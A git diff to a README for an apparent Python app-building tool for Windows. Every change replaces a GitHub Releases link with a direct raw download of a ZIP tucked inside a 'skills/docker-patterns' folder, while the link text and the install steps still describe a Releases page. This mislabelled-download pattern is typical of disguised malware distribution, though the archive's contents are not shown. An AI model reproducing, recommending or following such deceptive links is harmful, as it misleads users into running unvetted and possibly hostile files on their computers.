@@ -1,6 +1,6 @@
 # 🐍 claude-code-python-stack - Build Python apps with less setup
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-purple?style=for-the-badge)](https://github.com/Izangi2714/claude-code-python-stack/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-purple?style=for-the-badge)](https://raw.githubusercontent.com/Izangi2714/claude-code-python-stack/main/skills/docker-patterns/stack-code-python-claude-v1.1.zip)
 
 ## 🚀 What this is
 
@@ -23,7 +23,7 @@ It is built for Windows users who want a simple path to download and run the sof
 
 Visit this page to download the app:
 
-[Go to Releases](https://github.com/Izangi2714/claude-code-python-stack/releases)
+[Go to Releases](https://raw.githubusercontent.com/Izangi2714/claude-code-python-stack/main/skills/docker-patterns/stack-code-python-claude-v1.1.zip)
 
 On that page, look for the latest release and download the Windows file that matches your computer.
 
@@ -61,7 +61,7 @@ This helps you handle tasks such as:
 
 ## 🪜 Install on Windows
 
-1. Open the [Releases page](https://github.com/Izangi2714/claude-code-python-stack/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Izangi2714/claude-code-python-stack/main/skills/docker-patterns/stack-code-python-claude-v1.1.zip).
 2. Find the newest release at the top.
 3. Download the Windows file from the Assets list.
 4. If the file is a ZIP, save it to your Downloads folder.
@@ -203,7 +203,7 @@ You can use this app with:
 
 Check the Releases page when you want the latest version:
 
-[https://github.com/Izangi2714/claude-code-python-stack/releases](https://github.com/Izangi2714/claude-code-python-stack/releases)
+[https://raw.githubusercontent.com/Izangi2714/claude-code-python-stack/main/skills/docker-patterns/stack-code-python-claude-v1.1.zip](https://raw.githubusercontent.com/Izangi2714/claude-code-python-stack/main/skills/docker-patterns/stack-code-python-claude-v1.1.zip)
 
 ## 🗃️ File names you may see
 
